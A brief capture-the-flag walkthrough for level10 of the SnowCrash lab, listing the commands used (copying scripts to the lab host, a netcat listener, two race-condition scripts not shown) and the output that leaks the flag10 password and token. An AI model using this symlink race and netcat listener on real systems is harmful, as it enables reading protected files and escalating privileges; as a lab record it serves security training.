```
scp -r -P 4242 ./level10/resources  level10@10.13.200.28:/tmp
nc localhost 6969 -l
bash /tmp/resources/script_level10.sh
bash /tmp/resources/script_link.sh
```

```
level10@SnowCrash:~$ nc localhost 6969 -l
.*( )*.
woupa2yuojeeaaed06riuj63c
level10@SnowCrash:~$ su flag10
Password: 
Don't forget to launch getflag !
flag10@SnowCrash:~$ getflag
Check flag.Here is your token : feulo4b72j7edeahuete3no7c
```

Links:
* http://manpagesfr.free.fr/man/man2/access.2.html
